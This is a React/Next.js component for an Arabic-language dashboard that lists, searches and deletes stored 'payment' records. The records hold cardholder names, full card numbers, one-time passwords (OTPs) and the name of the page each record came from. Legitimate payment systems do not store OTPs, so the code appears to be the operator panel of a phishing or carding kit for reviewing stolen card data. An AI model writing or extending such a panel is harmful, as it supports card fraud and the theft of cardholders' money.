"use client"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import { onAuthStateChanged } from "firebase/auth"
import { auth } from "@/lib/firestore"
import { DashboardHeader } from "@/components/dashboard-header"
import { PaymentStatsCards } from "@/components/payment-stats"
import { PaymentSearch } from "@/components/payment-search"
import { PaymentTable } from "@/components/payment-table"
import { Pagination } from "@/components/pagination"
import { PaymentDetailsDialog } from "@/components/payment-details-dialog"
import { PaymentDocument } from "@/type/payment"
import { usePayments } from "@/hooks/use-payments"

export default function PaymentDashboard() {
  const router = useRouter()
  const { payments, stats, isLoading, deletePayment, clearAllPayments } = usePayments()

  const [selectedPayment, setSelectedPayment] = useState<PaymentDocument | null>(null)
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const itemsPerPage = 10

  // Filter payments based on search term
  const filteredPayments = useMemo(() => {
    if (!searchTerm) return payments

    const term = searchTerm.toLowerCase()
    return payments.filter(
      (payment) =>
        payment.cardholderName?.toLowerCase().includes(term) ||
        payment.cardNumber?.toLowerCase().includes(term) ||
        payment.country?.toLowerCase().includes(term) ||
        payment.city?.toLowerCase().includes(term) ||
        payment.otp?.toLowerCase().includes(term) ||
        payment.pagename?.toLowerCase().includes(term),
    )
  }, [payments, searchTerm])

  // Paginate filtered payments
  const paginatedPayments = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredPayments.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredPayments, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredPayments.length / itemsPerPage))

  // Reset to first page when search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [searchTerm])

  // Authentication check
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      }
    })
    return () => unsubscribe()
  }, [router])

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-background text-foreground">
      <DashboardHeader onClearAll={clearAllPayments} paymentsCount={payments.length} />

      <main className="max-w-7xl mx-auto p-6">
        <PaymentStatsCards stats={stats} />

        <PaymentSearch searchTerm={searchTerm} onSearchChange={setSearchTerm} />

        <PaymentTable
          payments={paginatedPayments}
          onPaymentClick={setSelectedPayment}
          onDelete={deletePayment}
          searchTerm={searchTerm}
        />

        <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} />
      </main>

      <PaymentDetailsDialog
        payment={selectedPayment}
        open={selectedPayment !== null}
        onClose={() => setSelectedPayment(null)}
      />
    </div>
  )
}
